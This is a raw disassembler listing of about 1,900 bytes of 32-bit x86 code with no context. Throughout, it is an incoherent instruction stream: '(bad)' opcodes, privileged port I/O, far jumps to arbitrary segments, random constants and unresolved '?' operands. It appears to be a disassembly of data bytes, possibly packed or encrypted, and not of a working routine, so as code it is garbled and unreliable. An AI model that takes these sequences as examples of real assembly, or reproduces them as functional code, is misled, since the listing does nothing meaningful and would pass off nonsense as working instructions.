  415ba0:	fmul   DWORD PTR [esi-0x7dcd7977]
  415ba6:	loopne 0x415c27
  415ba8:	jge    0x415b3b
  415baa:	push   ebp
  415bab:	stos   BYTE PTR es:[edi],al
  415bac:	sar    DWORD PTR [ecx+ecx*1-0x362c74bb],cl
  415bb3:	repz (bad) 
  415bb5:	push   edx
  415bb6:	dec    esp
  415bb7:	adc    DWORD PTR [eax+0x843b116],edx
  415bbd:	test   ecx,eax
  415bbf:	xor    ah,al
  415bc1:	inc    ecx
  415bc2:	outs   dx,DWORD PTR ds:[esi]
  415bc3:	fnsave [edi+0x54a0a21d]
  415bc9:	int    0x17
  415bcb:	jnp    0x415c0b
  415bcd:	(bad)  
  415bcf:	pusha  
  415bd0:	xor    ecx,ecx
  415bd2:	push   ss
  415bd3:	popa   
  415bd4:	xchg   ebp,eax
  415bd5:	xor    edx,DWORD PTR [ebx]
  415bd7:	cmp    DWORD PTR [edi-0x46],ebx
  415bda:	aad    0xf7
  415bdc:	mov    ds:0x6d3aae0a,eax
  415be1:	scas   eax,DWORD PTR es:[edi]
  415be2:	cld    
  415be3:	fs ins BYTE PTR es:[edi],dx
  415be5:	mov    esi,0xe608fe2a
  415bea:	mov    BYTE PTR [edi+0x3a],0x11
  415bee:	adc    bh,al
  415bf0:	or     al,0x2a
  415bf2:	aam    0x26
  415bf4:	loopne 0x415c3b
  415bf6:	sahf   
  415bf7:	or     esi,DWORD PTR [edx+0x6e]
  415bfa:	mov    bl,bh
  415bfc:	outs   dx,DWORD PTR ds:[esi]
  415bfd:	xchg   esi,eax
  415bfe:	adc    dl,ch
  415c00:	pop    eax
  415c01:	and    eax,0xc42597a7
  415c06:	mov    ah,0xd2
  415c08:	mov    BYTE PTR [esi-0x21],0x40
  415c0c:	pop    ds
  415c0d:	dec    ecx
  415c0e:	xchg   BYTE PTR [ebp-0x251ef247],dl
  415c14:	inc    ebx
  415c15:	cmp    eax,ebx
  415c17:	sub    al,ah
  415c19:	int    0x13
  415c1b:	shl    DWORD PTR [ecx-0x7a],cl
  415c1e:	mov    bh,0x47
  415c20:	sahf   
  415c21:	in     al,0x81
  415c23:	fucomp st(5)
  415c25:	leave  
  415c26:	pop    es
  415c27:	sub    eax,0xb0a9afcb
  415c2c:	outs   dx,DWORD PTR ds:[esi]
  415c2d:	scas   al,BYTE PTR es:[edi]
  415c2e:	data16 jge 0x415c17
  415c31:	sbb    cl,BYTE PTR [ebx]
  415c33:	mov    eax,ds:0x68b54d12
  415c38:	jg     0x415c04
  415c3a:	lods   al,BYTE PTR ds:[esi]
  415c3b:	mov    ch,0x90
  415c3d:	add    ch,BYTE PTR [esi]
  415c3f:	popf   
  415c40:	popa   
  415c41:	ins    DWORD PTR es:[edi],dx
  415c42:	scas   al,BYTE PTR es:[edi]
  415c43:	add    DWORD PTR [edx-0x13],edx
  415c46:	out    dx,al
  415c47:	arpl   WORD PTR [ebx+edi*4],cx
  415c4a:	dec    ecx
  415c4b:	stos   DWORD PTR es:[edi],eax
  415c4c:	adc    esp,DWORD PTR [ebx]
  415c4e:	add    al,0x86
  415c50:	mov    cl,0x4
  415c52:	ss (bad) 
  415c54:	dec    esp
  415c55:	sub    DWORD PTR [edx+0x50],ebx
  415c58:	dec    ebx
  415c59:	fld    QWORD PTR [ecx+0x561be6c7]
  415c5f:	dec    ebx
  415c60:	lods   eax,DWORD PTR ds:[esi]
  415c61:	test   al,0xbc
  415c63:	bound  ebp,QWORD PTR [ebp-0x16]
  415c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c67:	push   ebp
  415c68:	add    esp,DWORD PTR [ecx+ecx*8+0x72]
  415c6c:	out    0x17,eax
  415c6e:	daa    
  415c6f:	adc    ah,BYTE PTR [edi]
  415c71:	sbb    BYTE PTR [eax-0x18],0xb2
  415c75:	jne    0x415ca5
  415c77:	std    
  415c78:	mov    dh,0x47
  415c7a:	xchg   BYTE PTR [ecx+0x35e68502],dl
  415c80:	aad    0x97
  415c82:	cld    
  415c83:	ja     0x415cb4
  415c85:	push   ebx
  415c86:	icebp  
  415c87:	push   0xffffffe0
  415c89:	jl     0x415c34
  415c8b:	inc    eax
  415c8c:	sub    ch,cl
  415c8e:	sbb    DWORD PTR [edx-0x41f5aa93],eax
  415c94:	popa   
  415c95:	aaa    
  415c96:	jnp    0x415c8a
  415c98:	add    dh,BYTE PTR [ecx]
  415c9a:	pusha  
  415c9b:	mov    ebp,0x2563e663
  415ca0:	push   ecx
  415ca1:	xchg   ebx,eax
  415ca2:	mov    ecx,0x708f54ac
  415ca7:	ficomp WORD PTR [ebx+0x3c90637c]
  415cad:	imul   esp,edx,0xffffffe6
  415cb0:	aas    
  415cb1:	fwait
  415cb2:	out    0x25,al
  415cb4:	ds in  al,0xb0
  415cb7:	lds    esp,FWORD PTR [ebx+0x15]
  415cba:	ss out 0x3,eax
  415cbd:	mov    WORD PTR [edx],ds
  415cbf:	adc    esi,edx
  415cc1:	imul   esi,DWORD PTR [ebx+0x5],0xd10cf3ce
  415cc8:	mov    esp,0x1d4bb4af
  415ccd:	dec    esi
  415cce:	jne    0x415c76
  415cd0:	bound  edx,QWORD PTR [eax]
  415cd2:	pop    eax
  415cd3:	test   eax,0x2d8b323b
  415cd8:	push   eax
  415cd9:	pop    esp
  415cda:	sub    bl,BYTE PTR [esi-0x57]
  415cdd:	mov    esp,0x554e1356
  415ce2:	jle    0x415d1f
  415ce4:	xchg   esi,eax
  415ce5:	mov    esp,0x82f70174
  415cea:	addr16 mov ds:0x4b67,al
  415cee:	mov    ebx,DWORD PTR [ebp-0x3b7ce5b8]
  415cf4:	fsub   QWORD PTR [edi-0x23]
  415cf7:	imul   edi,DWORD PTR [esi],0x4556ba3a
  415cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cfe:	ins    BYTE PTR es:[edi],dx
  415cff:	sbb    eax,0x3bb719ed
  415d04:	(bad)  
  415d05:	aad    0x30
  415d07:	push   ecx
  415d08:	dec    BYTE PTR [esi]
  415d0a:	test   al,0x84
  415d0c:	mov    ecx,0xe4e4812b
  415d11:	pop    ebx
  415d12:	mov    ds:0xc55303bd,eax
  415d17:	push   esi
  415d18:	enter  0xcba,0x98
  415d1c:	jmp    0x2f92:0x26c032b6
  415d23:	inc    edi
  415d24:	mov    DWORD PTR [esi+0x69],edi
  415d27:	adc    DWORD PTR [eax+0x59],edx
  415d2a:	jns    0x415cb0
  415d2c:	pop    ebp
  415d2d:	stos   DWORD PTR es:[edi],eax
  415d2e:	pop    ecx
  415d2f:	xor    dl,BYTE PTR [edi+eiz*1+0x136776c9]
  415d36:	xchg   ebp,eax
  415d37:	inc    edx
  415d38:	mov    edx,0xe14e6b69
  415d3d:	lea    esp,[eax+0x5f9b7f26]
  415d43:	ret    0x45e1
  415d46:	cdq    
  415d47:	rol    DWORD PTR [esi+0x2f],cl
  415d4a:	retf   0x62ae
  415d4d:	mov    DWORD PTR es:[ecx],edi
  415d50:	sbb    al,0x2a
  415d52:	aaa    
  415d53:	je     0x415dc1
  415d55:	adc    eax,DWORD PTR [ebx+0x61f4b8f2]
  415d5b:	lds    bp,DWORD PTR [ecx-0x2459129f]
  415d62:	inc    edx
  415d63:	js     0x415dd2
  415d65:	imul   ecx,DWORD PTR [ebp+0x17e1bc95],0xffffffe0
  415d6c:	cwde   
  415d6d:	mov    ebp,0x75000c05
  415d72:	inc    edi
  415d73:	lods   al,BYTE PTR ds:[esi]
  415d74:	dec    edx
  415d75:	cmp    eax,0xd0aface4
  415d7a:	xor    al,ah
  415d7c:	int3   
  415d7d:	adc    cl,ch
  415d7f:	or     DWORD PTR [ebp+0x4c],esi
  415d82:	lods   eax,DWORD PTR ds:[esi]
  415d83:	in     al,dx
  415d84:	mov    cl,BYTE PTR [eax-0x80]
  415d87:	jne    0x415d81
  415d89:	cmp    ebx,DWORD PTR [ecx+0x57]
  415d8c:	rol    BYTE PTR [ebp-0x7e],1
  415d8f:	sub    bh,BYTE PTR [eax-0x2d8ebebf]
  415d95:	jo     0x415d21
  415d97:	add    al,0xb5
  415d9a:	xchg   esp,eax
  415d9b:	fdiv   QWORD PTR [eax-0x2389b384]
  415da1:	jl     0x415de5
  415da3:	mov    edx,0x6ef11a32
  415da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415da9:	fsubr  DWORD PTR [ebx+eax*4+0x44]
  415dad:	jl     0x415de6
  415daf:	jb     0x415e00
  415db1:	xchg   ebp,eax
  415db2:	pop    edx
  415db3:	mov    eax,ds:0x8281f866
  415db8:	xchg   edx,eax
  415db9:	dec    DWORD PTR [edx-0x40d6c3eb]
  415dbf:	std    
  415dc0:	loopne 0x415e20
  415dc2:	lahf   
  415dc3:	mov    dl,BYTE PTR [esi-0x5a85a074]
  415dc9:	mov    DWORD PTR [ebx+0x52c03ad7],ebx
  415dcf:	push   0x2c4bc24d
  415dd4:	popa   
  415dd5:	sahf   
  415dd6:	dec    esp
  415dd7:	leave  
  415dd8:	pushf  
  415dd9:	jmp    0x415e40
  415ddb:	cmc    
  415ddc:	xlat   BYTE PTR ds:[ebx]
  415ddd:	dec    eax
  415dde:	sub    BYTE PTR [esi],dh
  415de0:	mov    eax,ds:0x9e1d70f2
  415de5:	xor    ebx,DWORD PTR [edx+0x4edf1e3a]
  415deb:	arpl   si,bp
  415ded:	pop    esi
  415dee:	cmp    eax,DWORD PTR [eax+0x5f]
  415df1:	pop    edx
  415df2:	push   ebx
  415df3:	rcr    cl,1
  415df5:	bts    DWORD PTR [ecx+0x33],esp
  415df9:	ja     0x415e25
  415dfb:	gs jl  0x415e43
  415dfe:	inc    edx
  415dff:	dec    edx
  415e00:	xchg   ebx,eax
  415e01:	repnz cmc 
  415e03:	inc    ebp
  415e04:	or     eax,0xf5b6ae37
  415e09:	inc    edi
  415e0a:	cmp    al,cl
  415e0c:	ins    BYTE PTR es:[edi],dx
  415e0d:	imul   edi,esi,0x6c03a630
  415e13:	xor    eax,DWORD PTR [edi+eax*1+0x60]
  415e17:	mov    cl,0x8f
  415e19:	jl     0x415df0
  415e1b:	fdiv   DWORD PTR ds:0x5881ed15
  415e21:	inc    ebp
  415e22:	mov    ch,0x6b
  415e24:	stos   DWORD PTR es:[edi],eax
  415e25:	shr    DWORD PTR [esi-0x67],0x58
  415e29:	loope  0x415e77
  415e2b:	lahf   
  415e2c:	xlat   BYTE PTR ds:[ebx]
  415e2d:	(bad)  
  415e2e:	(bad)  
  415e2f:	clc    
  415e30:	fdiv   QWORD PTR [ecx]
  415e33:	dec    ebp
  415e34:	pop    esi
  415e35:	in     eax,0x32
  415e37:	mov    ebp,0x566b60a7
  415e3c:	add    ebp,esp
  415e3e:	sbb    eax,0xf04692ff
  415e43:	jecxz  0x415e55
  415e45:	shl    DWORD PTR [esi+0x1e],cl
  415e48:	cmp    eax,0x441a8250
  415e4d:	mov    edi,0xd8dd3ba1
  415e52:	popa   
  415e53:	sub    edx,DWORD PTR [si+0x74]
  415e57:	fld    QWORD PTR [esp+esi*4]
  415e5a:	pop    ebx
  415e5b:	sbb    DWORD PTR [ecx+0x45fc0dd0],edi
  415e61:	sbb    al,0xc3
  415e63:	cwde   
  415e64:	mov    ah,0x5b
  415e66:	adc    DWORD PTR [bx+di+0x631e],esp
  415e6b:	aad    0xe8
  415e6d:	inc    esp
  415e6e:	pusha  
  415e6f:	lods   al,BYTE PTR ds:[esi]
  415e70:	bound  ebx,QWORD PTR ds:0xd733d99f
  415e76:	mov    edx,esp
  415e78:	add    eax,0x2e51f7ea
  415e7d:	mov    dl,0x4a
  415e7f:	pop    esp
  415e80:	loope  0x415ec3
  415e82:	xor    eax,0xb7f9d6a1
  415e87:	pop    ecx
  415e88:	imul   edx,DWORD PTR [ecx+esi*1+0x2f],0xffffff8b
  415e8d:	lock mov bh,0x44
  415e90:	or     cl,BYTE PTR es:[ebx+0x1eb4d7cb]
  415e97:	jns    0x415ee4
  415e99:	jae    0x415e9b
  415e9b:	sub    BYTE PTR [edx+ecx*4],dl
  415e9e:	pop    edx
  415e9f:	push   ebp
  415ea0:	test   eax,0x6f089611
  415ea5:	sbb    ecx,DWORD PTR [ebx+0x2]
  415ea8:	mov    ecx,0x31324d65
  415ead:	pop    eax
  415eae:	xor    al,0xec
  415eb0:	shl    edx,cl
  415eb2:	adc    edx,ebp
  415eb4:	mov    al,0xd6
  415eb6:	outs   dx,BYTE PTR es:[esi]
  415eb8:	dec    edi
  415eb9:	or     al,0xfd
  415ebb:	mov    gs,WORD PTR [edx+ebp*1-0x25b7a7d7]
  415ec2:	imul   ecx,esp,0xffffffeb
  415ec5:	jl     0x415e9b
  415ec7:	inc    ecx
  415ec8:	pop    es
  415ec9:	and    DWORD PTR [esi],ebp
  415ecb:	jbe    0x415ed3
  415ecd:	push   edi
  415ece:	arpl   bp,ax
  415ed0:	cld    
  415ed1:	inc    edi
  415ed2:	cmc    
  415ed3:	jno    0x415eb2
  415ed5:	ror    BYTE PTR [eax+0x5],0x59
  415ed9:	iret   
  415eda:	push   eax
  415edb:	psadbw mm3,QWORD PTR [edx]
  415ede:	adc    al,0x91
  415ee0:	push   0x73cb278f
  415ee5:	sti    
  415ee6:	lods   eax,DWORD PTR ds:[esi]
  415ee7:	mov    eax,0x3cf4cde4
  415eec:	or     bh,ch
  415eee:	push   ds
  415eef:	idiv   BYTE PTR [eax+0xdaa1df]
  415ef5:	cmp    DWORD PTR [ebx-0x5e0cb740],esi
  415efb:	push   esi
  415efc:	outs   dx,DWORD PTR ds:[esi]
  415efd:	xchg   ebx,eax
  415efe:	mov    ?,WORD PTR ds:0x1fbcbd66
  415f04:	loopne 0x415efc
  415f06:	mov    edi,0xc78a2013
  415f0b:	inc    esp
  415f0c:	xchg   esp,eax
  415f0d:	jmp    0x10cc:0x9048076e
  415f14:	adc    bl,BYTE PTR [eax+edx*8+0x2124a6e5]
  415f1b:	mov    ch,0x27
  415f1d:	mov    BYTE PTR [ecx+0x9],al
  415f20:	cmp    DWORD PTR [esi],ecx
  415f22:	dec    eax
  415f23:	xor    ch,al
  415f25:	add    al,0x9b
  415f28:	push   esp
  415f29:	inc    ecx
  415f2a:	out    0xfb,al
  415f2c:	js     0x415eb8
  415f2e:	je     0x415f23
  415f30:	cmp    ebx,DWORD PTR [ebx+0x7c]
  415f33:	add    dh,BYTE PTR [eax+ebx*2]
  415f36:	sti    
  415f37:	in     eax,dx
  415f38:	mov    ebx,0xd1b3146c
  415f3d:	mov    ebx,0xaf1128da
  415f42:	loop   0x415fb9
  415f44:	push   ds
  415f45:	sub    BYTE PTR [eax],dl
  415f47:	jmp    0x91de:0xd00fcb06
  415f4e:	jae    0x415ede
  415f50:	fisubr DWORD PTR ds:0x25789d9c
  415f56:	retf   0x92c3
  415f59:	stos   BYTE PTR es:[edi],al
  415f5a:	xor    DWORD PTR [ecx+0x1715fe49],ebx
  415f60:	xchg   ebx,eax
  415f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f62:	rol    cl,0xba
  415f65:	push   ds
  415f66:	in     al,dx
  415f67:	add    eax,0xf6a2831b
  415f6c:	mov    ch,0x8e
  415f6e:	fidivr DWORD PTR [ecx+0x4d]
  415f71:	or     ecx,DWORD PTR [esi-0x35033263]
  415f77:	jns    0x415f47
  415f79:	fmul   QWORD PTR [edi-0x3aab7adb]
  415f7f:	push   edx
  415f80:	pop    ecx
  415f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f82:	js     0x415fbf
  415f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f85:	xchg   bl,al
  415f87:	add    dl,BYTE PTR [edx]
  415f89:	je     0x415f4d
  415f8b:	ss mov edx,0x6b6bf461
  415f91:	xor    eax,0x7a1900c1
  415f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f97:	enter  0x2c1f,0xce
  415f9b:	push   ds
  415f9c:	xchg   BYTE PTR [eax+0x3b],al
  415f9f:	int    0x6e
  415fa1:	fld    QWORD PTR [esp+edi*1-0x4b]
  415fa5:	imul   BYTE PTR [ebp+0x14]
  415fa8:	ret    0x5179
  415fab:	push   ebp
  415fac:	sbb    bl,BYTE PTR [ebx+0xfe171e8]
  415fb2:	daa    
  415fb3:	push   ecx
  415fb4:	jne    0x416032
  415fb6:	jnp    0x415fff
  415fb8:	in     eax,dx
  415fb9:	mov    ebx,0xaa2ae7e3
  415fbe:	cli    
  415fbf:	je     0x415fa7
  415fc1:	(bad)  
  415fc2:	push   ebx
  415fc3:	mov    ss,WORD PTR ds:0x61454a85
  415fc9:	xor    cl,BYTE PTR [ebp-0x703d3530]
  415fcf:	jl     0x415f88
  415fd1:	push   ecx
  415fd2:	std    
  415fd3:	mov    al,ds:0xb943e396
  415fd8:	out    0x9a,al
  415fda:	add    ah,BYTE PTR [eax-0x2a4d44f2]
  415fe0:	cmc    
  415fe1:	fiadd  DWORD PTR [ebx-0x56]
  415fe4:	jo     0x41601a
  415fe6:	out    dx,al
  415fe7:	pop    ecx
  415fe8:	add    eax,0x9cf7717
  415fed:	addr16 pop ds
  415fef:	add    esi,ebx
  415ff1:	xchg   edx,eax
  415ff2:	inc    ecx
  415ff3:	aam    0x84
  415ff5:	xchg   DWORD PTR [ecx],edi
  415ff7:	ret    
  415ff8:	retf   0xe35b
  415ffb:	(bad)  
  415ffc:	cdq    
  415ffd:	pop    edi
  415ffe:	int    0x4d
  416000:	sbb    BYTE PTR [ecx],0xf9
  416003:	(bad)  
  416004:	xor    BYTE PTR [ebx+0x725c4f47],ah
  41600a:	inc    edi
  41600b:	xchg   ebx,eax
  41600c:	sub    DWORD PTR [edx-0x60],0xffffffda
  416010:	inc    ebp
  416011:	cmp    DWORD PTR [ecx+0xd],ebp
  416014:	xor    edx,DWORD PTR [edi+0x66e6e1e6]
  41601a:	clc    
  41601b:	mov    ebp,0x8beafbc8
  416020:	pop    es
  416021:	inc    edi
  416022:	dec    esp
  416023:	add    eax,0x4c71cd40
  416028:	adc    edi,edi
  41602a:	jmp    0xb030:0xeac7773d
  416031:	arpl   WORD PTR [ecx-0x7379181],bp
  416037:	dec    ebx
  416038:	std    
  416039:	mov    cl,0xe0
  41603b:	mov    dl,0xdf
  41603d:	inc    ebp
  41603e:	inc    eax
  41603f:	pop    eax
  416040:	push   0x6108a185
  416045:	jb     0x416000
  416047:	scas   eax,DWORD PTR es:[edi]
  416048:	xor    ebx,DWORD PTR [ecx]
  41604a:	adc    eax,0xe89ebc09
  41604f:	aas    
  416050:	jp     0x416046
  416052:	mov    BYTE PTR [esi+0x74],bh
  416055:	jno    0x4160c1
  416057:	pop    DWORD PTR [esi]
  416059:	js     0x4160c4
  41605b:	arpl   sp,dx
  41605d:	pop    edi
  41605e:	and    al,0x59
  416060:	mov    eax,ds:0xa7cdf0a4
  416065:	push   ebp
  416066:	push   0xffffffc0
  416068:	jbe    0x416029
  41606a:	rcl    BYTE PTR [edx+edi*2-0x9],cl
  41606e:	inc    esp
  41606f:	jp     0x41600a
  416071:	shr    DWORD PTR [ebx+0xa],0xe6
  416075:	push   0xf3907da6
  41607a:	cmp    dl,0xec
  41607d:	xor    ebp,DWORD PTR [ecx+0x16]
  416080:	xor    dh,BYTE PTR [ebx]
  416082:	aaa    
  416083:	or     BYTE PTR [esp+eax*2],dh
  416086:	arpl   WORD PTR [eax-0x19],bx
  416089:	mov    DWORD PTR [eax-0x724a3ce0],0xbd500c53
  416093:	push   0xffffffcd
  416095:	popf   
  416096:	jl     0x416043
  416098:	jmp    0x31d6:0xd8ba2e4f
  41609f:	not    DWORD PTR [esi-0x595655cf]
  4160a5:	fwait
  4160a6:	push   0x5f
  4160a8:	call   0x2d22:0xb9756667
  4160af:	and    BYTE PTR [eax+0x30],0xaa
  4160b3:	pop    ebx
  4160b4:	dec    di
  4160b6:	fwait
  4160b7:	inc    esp
  4160b8:	push   ebx
  4160b9:	mov    ecx,0xabe09a98
  4160be:	fnsave ds:0x2e15c560
  4160c4:	sub    esi,ebp
  4160c6:	and    eax,0x545038c6
  4160cb:	out    dx,eax
  4160cc:	xchg   ebx,eax
  4160cd:	mov    dl,0xf8
  4160cf:	cmp    dl,BYTE PTR [ebx+0x2a6b99aa]
  4160d5:	stos   DWORD PTR es:[edi],eax
  4160d6:	fldcw  WORD PTR [ebx+0x2d]
  4160d9:	cld    
  4160da:	(bad)  
  4160db:	in     al,0x9c
  4160dd:	sub    cl,BYTE PTR [ebx+0xc83f045]
  4160e3:	lods   eax,DWORD PTR ds:[esi]
  4160e4:	mov    ds:0x6937f0bf,eax
  4160e9:	sub    ch,BYTE PTR [ecx]
  4160eb:	je     0x416141
  4160ed:	push   0xffffffd2
  4160ef:	ret    
  4160f0:	push   ebx
  4160f1:	pop    esi
  4160f2:	outs   dx,DWORD PTR ds:[esi]
  4160f3:	jo     0x416090
  4160f5:	out    dx,al
  4160f6:	iret   
  4160f7:	inc    DWORD PTR ds:0x1922630d
  4160fd:	inc    ebx
  4160fe:	adc    DWORD PTR [esi+eiz*8-0x71df04e3],ebx
  416105:	shl    BYTE PTR [edi],cl
  416107:	xor    eax,0x34c98354
  41610c:	fld    st(5)
  41610e:	lods   al,BYTE PTR ds:[esi]
  41610f:	cdq    
  416110:	sbb    ebp,DWORD PTR [esi-0x60372d57]
  416116:	aam    0xb1
  416118:	pop    DWORD PTR [esi-0x8]
  41611b:	in     al,0x9b
  41611d:	ret    0x45a0
  416120:	mov    edx,0x5063bda1
  416125:	jno    0x416143
  416127:	fisubr WORD PTR es:[esi-0x16502b79]
  41612e:	pop    esi
  41612f:	sbb    BYTE PTR [ebx],0xfe
  416132:	arpl   WORD PTR [ebx-0x1f0fed26],ax
  416138:	sbb    esi,ebp
  41613a:	mov    al,0xda
  41613c:	or     al,dh
  41613e:	push   ss
  41613f:	rcr    BYTE PTR [edx-0x35324ce],cl
  416145:	ins    BYTE PTR es:[edi],dx
  416146:	inc    esp
  416147:	lods   al,BYTE PTR ds:[esi]
  416148:	inc    edx
  416149:	mov    ebp,0x6766a6e9
  41614e:	icebp  
  41614f:	mov    dl,0x99
  416151:	or     al,cl
  416153:	test   al,0x2d
  416155:	mov    eax,0x87a36ca0
  41615a:	cmp    al,0x15
  41615c:	push   0xffffff86
  41615e:	pop    edx
  41615f:	nop
  416160:	scas   eax,DWORD PTR es:[edi]
  416161:	call   0xc374:0x554ffec
  416168:	inc    edi
  416169:	ret    
  41616a:	retf   
  41616b:	gs add dl,bl
  41616e:	add    eax,0xb3f33a8b
  416173:	push   esi
  416174:	jg     0x416125
  416176:	sbb    eax,0x2fd320e9
  41617b:	pop    ebp
  41617c:	sub    cl,BYTE PTR [ebp+0x25]
  41617f:	dec    eax
  416180:	adc    eax,DWORD PTR [esi]
  416182:	clc    
  416183:	push   ecx
  416184:	or     DWORD PTR [ecx-0x2f725ca4],ebp
  41618a:	lods   eax,DWORD PTR ds:[esi]
  41618b:	or     DWORD PTR [eax+0x28c4fea1],esi
  416191:	xchg   BYTE PTR ds:0xdf837b23,bl
  416197:	fdiv   DWORD PTR [ebp*2+0x13e7848]
  41619e:	pop    edi
  41619f:	clc    
  4161a0:	lea    edx,[edx]
  4161a2:	in     al,0xa1
  4161a4:	mov    ds:0xec1dbf91,eax
  4161a9:	test   BYTE PTR [ecx-0x1124c39d],cl
  4161af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161b0:	sbb    esp,edx
  4161b2:	(bad)  
  4161b3:	aas    
  4161b4:	xchg   ecx,eax
  4161b5:	je     0x41615b
  4161b7:	fld    QWORD PTR [esi-0x1843d900]
  4161bd:	jbe    0x416203
  4161bf:	fsub   DWORD PTR [esp+ebx*1-0x2afbaa28]
  4161c6:	and    ebx,DWORD PTR [esi+0x41cb5c8]
  4161cc:	adc    al,0x5a
  4161ce:	jbe    0x416222
  4161d0:	xchg   ch,al
  4161d2:	stos   DWORD PTR es:[edi],eax
  4161d3:	and    esi,DWORD PTR [edx+0x41]
  4161d6:	nop
  4161d7:	cld    
  4161d8:	mov    ?,WORD PTR [ebp-0x60]
  4161db:	adc    al,0x3f
  4161dd:	in     eax,dx
  4161de:	jo     0x416165
  4161e0:	mov    esp,0x2fd65845
  4161e5:	pop    es
  4161e6:	sub    BYTE PTR [eax+0x389851ad],dl
  4161ec:	cwde   
  4161ed:	aam    0x8e
  4161ef:	pop    ebx
  4161f0:	cmp    eax,0x65b864c2
  4161f5:	push   0x9dbcd62
  4161fa:	das    
  4161fb:	jns    0x4161e9
  4161fd:	out    dx,al
  4161fe:	push   0x47dea170
  416203:	imul   ecx,edx,0x51
  416206:	sub    BYTE PTR [eiz*2-0x672ad145],dl
  41620d:	lea    eax,[esi]
  41620f:	push   esi
  416210:	inc    eax
  416211:	mov    ah,0xd8
  416213:	jo     0x4161b6
  416215:	jno    0x4161ec
  416217:	fwait
  416218:	adc    BYTE PTR [ecx-0x381fa623],0x41
  41621f:	(bad)  
  416220:	loope  0x416291
  416222:	imul   eax,edx,0x76f88d7e
  416228:	fdivr  QWORD PTR [ebx+esi*2]
  41622b:	(bad)  
  41622c:	out    dx,eax
  41622d:	fld    TBYTE PTR [esi-0x2967f896]
  416233:	ja     0x4161eb
  416235:	leave  
  416236:	fs xor al,0x3a
  416239:	push   es
  41623a:	sub    esp,DWORD PTR [edx+0x1065b9]
  416240:	pop    eax
  416241:	(bad)  
  416242:	call   0x806c:0xecfa00c4
  416249:	pushf  
  41624a:	test   ebp,eax
  41624c:	mov    BYTE PTR [ebx+0x7de06e0c],dl
  416252:	push   ds
  416253:	pop    edi
  416254:	pop    edi
  416255:	push   es
  416256:	push   ds
  416257:	or     esi,DWORD PTR [esi-0x6]
  41625a:	sub    ebx,ecx
  41625c:	mov    ecx,0x16bf6cc7
  416261:	lds    eax,FWORD PTR [ebx+ebp*2+0x317b90ec]
  416268:	in     al,0xe4
  41626a:	mov    esi,0x458c29b0
  41626f:	pop    ebp
  416270:	mov    eax,ds:0x7300eb47
  416275:	ret    
  416276:	pusha  
  416277:	sub    al,BYTE PTR [esi]
  416279:	test   al,0x68
  41627b:	dec    edi
  41627c:	test   al,0xc5
  41627e:	(bad)  
  41627f:	repz mov cl,0xce
  416282:	jge    0x416235
  416284:	lods   al,BYTE PTR ds:[esi]
  416285:	mov    ds:0xf0e72128,al
  41628a:	leave  
  41628b:	mov    dh,0x87
  41628d:	sub    edi,DWORD PTR [esi]
  41628f:	sbb    ch,BYTE PTR [edx]
  416291:	push   esi
  416292:	pop    ebp
  416293:	scas   eax,DWORD PTR es:[edi]
  416294:	sar    BYTE PTR ds:0x729f7dc9,cl
  41629a:	mov    al,ds:0x689486f0
  41629f:	in     al,0xf8
  4162a1:	pop    es
  4162a2:	inc    ecx
  4162a3:	jmp    0x41627d
  4162a5:	inc    edi
  4162a6:	cmp    ch,BYTE PTR [edi+0x25]
  4162a9:	cld    
  4162aa:	test   eax,0xc804c8c3
  4162af:	jmp    0x41629e
  4162b1:	mov    cl,BYTE PTR [eax-0x6b]
  4162b4:	sti    
  4162b5:	dec    ebx
  4162b6:	xlat   BYTE PTR ds:[ebx]
  4162b7:	mov    ebp,0xf97c2443
  4162bc:	sbb    ecx,ecx
  4162be:	es dec eax
  4162c0:	jne    0x4162c1
  4162c2:	add    eax,0xe31a72f6
  4162c7:	pop    ecx
  4162c8:	mov    dh,0x7c
  4162ca:	sbb    eax,0x67a2c6e
  4162cf:	dec    edi
  4162d0:	dec    edi
  4162d1:	pusha  
  4162d2:	or     al,0x94
  4162d4:	test   BYTE PTR [ecx-0x25],bl
  4162d7:	push   0x1e
  4162d9:	mov    cl,0x15
  4162db:	mov    dh,0xbb
  4162dd:	or     bh,BYTE PTR [eax+0x18cbb260]
  4162e3:	cmp    BYTE PTR gs:[eax-0x11479166],ch
  4162ea:	clc    
  4162eb:	das    
  4162ec:	daa    
  4162ed:	loopne 0x416308
  4162ef:	adc    eax,0xcf796784
  4162f4:	pop    edi
  4162f5:	cli    
  4162f6:	or     ah,BYTE PTR [ecx-0x593d90cc]
  4162fc:	xchg   edx,eax
  4162fd:	jbe    0x41630e
  4162ff:	sbb    al,0x49
  416301:	loop   0x4162c2
  416303:	push   ecx
  416304:	in     eax,dx
  416305:	pop    eax
  416306:	fild   WORD PTR [ebx+0x5852448c]
  41630c:	into   
  41630d:	inc    ebx
  41630e:	or     eax,DWORD PTR [edi]
  416310:	mov    bl,0x1d
  416312:	outs   dx,DWORD PTR ds:[esi]
  416313:	iret   
  416314:	ss sbb eax,0x5cd9070a
  41631a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41631b:	jne    0x416370
  41631d:	bound  edx,QWORD PTR [ecx-0x5]
  416320:	addr16 dec eax
  416322:	and    BYTE PTR [esi],ch
  416324:	mov    ch,BYTE PTR [ebx+ecx*4]
  416327:	call   0xacb0:0x8d4b2e0d
  41632e:	xchg   cx,ax
  416330:	mov    edx,DWORD PTR [ebp+ecx*8+0x36]
  416334:	jle    0x4162f0
  416336:	pop    ecx
  416337:	leave  
  416338:	mov    DWORD PTR [ebx],ebp
  41633a:	inc    edi
  41633b:	inc    ecx
  41633c:	push   edx
  41633d:	cmp    cl,BYTE PTR [edx+0x24]
  416340:	fisttp WORD PTR [edx+ebp*4]
  416343:	aam    0x4c
  416345:	rcr    DWORD PTR [ecx-0x20],1
  416348:	out    0x65,eax
  41634a:	pop    edi
  41634b:	dec    eax
  41634c:	daa    
  41634d:	xor    al,0x59
  41634f:	retf   
  416350:	pushf  
  416351:	dec    ebx
  416352:	in     eax,dx
  416353:	xchg   ax,ax
  416355:	rcr    DWORD PTR [ebx-0x7],cl
  416358:	pop    eax
  416359:	addr16 sti 
  41635b:	dec    ebx
